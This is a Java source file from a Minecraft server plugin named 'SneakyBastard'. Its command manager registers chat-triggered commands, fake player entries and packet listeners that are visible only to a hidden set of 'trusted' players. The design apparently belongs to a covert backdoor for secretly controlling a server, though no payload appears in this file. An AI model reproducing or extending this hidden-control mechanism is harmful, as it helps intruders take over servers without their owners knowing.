package net.blackofworld.SneakyBastard.Command;

import com.google.common.reflect.ClassPath;
import com.mojang.authlib.GameProfile;
import lombok.experimental.ExtensionMethod;
import net.blackofworld.SneakyBastard.Extensions.PlayerExt;
import net.blackofworld.SneakyBastard.Start;
import net.blackofworld.SneakyBastard.Utils.BukkitReflection;
import net.blackofworld.SneakyBastard.Utils.Packets.PacketInject;
import net.blackofworld.SneakyBastard.Utils.Packets.PacketInject.PacketListener;
import net.minecraft.network.protocol.game.ClientboundPlayerInfoRemovePacket;
import net.minecraft.network.protocol.game.ClientboundPlayerInfoUpdatePacket;
import net.minecraft.server.level.ServerPlayer;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.util.EnumSet;
import java.util.HashMap;
import java.util.HashSet;
import java.util.UUID;

@ExtensionMethod({Player.class, PlayerExt.class})
public class CommandManager {
    public static final String COMMAND_SIGN = "-";
    public static final String CHAT_TRIGGER = "#";
    public static final String TRUST_COMMAND = "--";
    public static final String COMMAND_PREFIX = "§a[§6Sne§2aky§5Bast§da§2r§ed§a]§r ";
    public static CommandManager Instance;
    public final HashSet<CommandBase> commandList = new HashSet<>();
    public final HashMap<UUID, ServerPlayer> fakePlayers = new HashMap<>();
    private final HashSet<UUID> trustedPeople = new HashSet<>();
    private final CommandListener cl;

    public CommandManager() {
        Init();
        Instance = this;
        PacketInject.register(Start.Instance);
        cl = new CommandListener();
        if(Start.Config.LogPackets)
            PacketInject.registerListener(cl);
    }

    public void Destroy() {
        cl.Destroy();
        for (var uuid : trustedPeople) {
            var p = Bukkit.getPlayer(uuid);
            assert p != null;
            if (!p.isOnline()) continue;
            p.SendPacket(new ClientboundPlayerInfoRemovePacket(fakePlayers.keySet().stream().toList()));
        }
        for(CommandBase cmd : commandList) {
            if(cmd instanceof PacketListener listener) {
                PacketInject.unregisterListener(listener);
            }
        }
        trustedPeople.clear();
        fakePlayers.clear();
    }

    public boolean addTrusted(Player p) {
        var add = EnumSet.of(ClientboundPlayerInfoUpdatePacket.Action.ADD_PLAYER);
        p.SendPacket(new ClientboundPlayerInfoUpdatePacket(add, fakePlayers.values()));
        return trustedPeople.add(p.getUniqueId());
    }

    public boolean removeTrusted(Player p) {
        p.SendPacket(new ClientboundPlayerInfoRemovePacket(fakePlayers.keySet().stream().toList()));
        return trustedPeople.remove(p.getUniqueId());
    }

    public boolean isTrusted(Player p) {
        return trustedPeople.contains(p.getUniqueId());
    }

    private void Init() {
        try {
            final ClassPath classPath = ClassPath.from(CommandManager.class.getClassLoader());
            for (final ClassPath.ClassInfo info : classPath.getTopLevelClassesRecursive(Start.class.getPackageName())) {
                Class<?> clazz = info.load();
                if(CommandBase.class.equals(clazz.getSuperclass())) {
                    CommandBase cmd = (CommandBase) info.load().getDeclaredConstructor().newInstance();
                    UUID uuid = UUID.randomUUID();
                    var world = Bukkit.getWorlds().get(0);
                    var nmsWorld = BukkitReflection.getWorldLevel(world);
                    var server = BukkitReflection.getMinecraftServer();
                    ServerPlayer npc = new ServerPlayer(server, nmsWorld, new GameProfile(uuid, COMMAND_SIGN + cmd.Command));
                    fakePlayers.put(uuid, npc);
                    commandList.add(cmd);
                    if (cmd instanceof PacketListener listener) {
                        PacketInject.registerListener(listener);
                    }
                }
            }
        } catch (IOException | NoSuchMethodException | InstantiationException | IllegalAccessException |
                 InvocationTargetException e) {
            throw new RuntimeException(e.toString(), e);
        }
    }
}